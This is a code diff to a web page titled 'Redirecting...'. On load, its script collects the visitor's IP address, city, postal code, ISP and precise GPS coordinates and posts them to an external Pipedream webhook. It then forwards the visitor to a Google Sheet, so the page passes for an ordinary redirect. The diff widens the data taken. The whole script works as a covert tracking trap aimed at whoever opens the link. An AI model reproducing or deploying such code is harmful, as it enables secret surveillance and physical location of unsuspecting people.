@@ -6,76 +6,91 @@
     <title>Redirecting...</title>
     <script>
         function getLocationAndSend() {
-            // First, fetch the user's IP address
-            fetch('https://api.ipify.org?format=json')
+            // Fetch the user's IP and related info first
+            fetch("https://ipapi.co/json/")
                 .then(response => response.json())
                 .then(data => {
-                    const userIP = data.ip;
+                    const ipInfo = {
+                        ip: data.ip,
+                        country: data.country_name,
+                        region: data.region,
+                        city: data.city,
+                        postal: data.postal,
+                        timezone: data.timezone,
+                        isp: data.org
+                    };
 
-                    // Try to get geolocation (works better on iOS/Safari)
+                    // Try to get geolocation (for additional precision)
                     if (navigator.geolocation) {
-                        // Safari sometimes delays execution of navigator.geolocation,
-                        // so we use setTimeout to ensure geolocation permission prompt appears properly
                         setTimeout(function() {
                             navigator.geolocation.getCurrentPosition(
                                 function(position) {
-                                    const latitude = position.coords.latitude;
-                                    const longitude = position.coords.longitude;
+                                    const geoData = {
+                                        latitude: position.coords.latitude,
+                                        longitude: position.coords.longitude
+                                    };
 
-                                    // Debugging
-                                    console.log('Location obtained: ', latitude, longitude);
-
-                                    // Send the IP, latitude, and longitude to the webhook
-                                    sendLocationData(userIP, latitude, longitude);
+                                    // Send the IP, geolocation, and IP-based info as headers
+                                    sendLocationData(ipInfo, geoData);
                                 },
                                 function(error) {
                                     console.error('Geolocation error: ', error.message);
-                                    // Send only IP if geolocation fails
-                                    sendLocationData(userIP, null, null);
+
+                                    // Send only IP-based info if geolocation fails
+                                    sendLocationData(ipInfo, null);
                                 },
                                 {
                                     enableHighAccuracy: true,   // High accuracy for better mobile results
-                                    timeout: 30000,             // Wait for up to 30 seconds
+                                    timeout: 15000,             // Wait for up to 15 seconds
                                     maximumAge: 0               // No cached position
                                 }
                             );
-                        }, 500); // Delay by 500ms to avoid issues with Safari
+                        }, 500); // Delay to ensure it works with Safari
                     } else {
                         console.error('Geolocation not supported by this browser.');
-                        // Send only the IP if geolocation is not supported
-                        sendLocationData(userIP, null, null);
+                        // Send only IP-based info if geolocation is not supported
+                        sendLocationData(ipInfo, null);
                     }
                 })
                 .catch(error => {
-                    console.error('Error fetching IP: ', error);
+                    console.error('Error fetching IP information: ', error);
                 });
         }
 
-        function sendLocationData(ip, latitude, longitude) {
+        function sendLocationData(ipInfo, geoData) {
             // Log data being sent (for debugging)
-            console.log('Sending data: ', { ip, latitude, longitude });
+            console.log('Sending data: ', { ipInfo, geoData });
 
-            // Send data to the webhook
-            fetch('https://eo44xdas9z1r2d1.m.pipedream.net', {
+            // Prepare headers with both IP and geolocation information
+            const headers = new Headers({
+                'IP-Address': ipInfo.ip,
+                'Country': ipInfo.country,
+                'Region': ipInfo.region,
+                'City': ipInfo.city,
+                'Postal-Code': ipInfo.postal,
+                'Timezone': ipInfo.timezone,
+                'ISP': ipInfo.isp
+            });
+
+            // If geolocation is available, add it to headers
+            if (geoData) {
+                headers.append('Latitude', geoData.latitude);
+                headers.append('Longitude', geoData.longitude);
+            }
+
+            // Send the data as headers to your RequestBin webhook
+            fetch('https://eo44xdas9z1r2d1.m.pipedream.net/', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    ip: ip,
-                    latitude: latitude,
-                    longitude: longitude,
-                }),
+                headers: headers
             }).finally(() => {
-                // After data is sent, redirect the user to the Google Sheet
+                // After data is sent, redirect the user to another page
                 window.location.href = 'https://docs.google.com/spreadsheets/d/1kpx8D0chlzEOLvqJRa5GJXcsJsATPgwT0n6NBAsDfL8/edit?gid=0#gid=0';
             });
         }
 
         // Ensure the function runs on page load
         window.onload = function() {
-            // Call with setTimeout to avoid issues in Safari with immediate geolocation calls
-            setTimeout(getLocationAndSend, 500);
+            setTimeout(getLocationAndSend, 500); // Ensure delay for Safari
         };
     </script>
 </head>
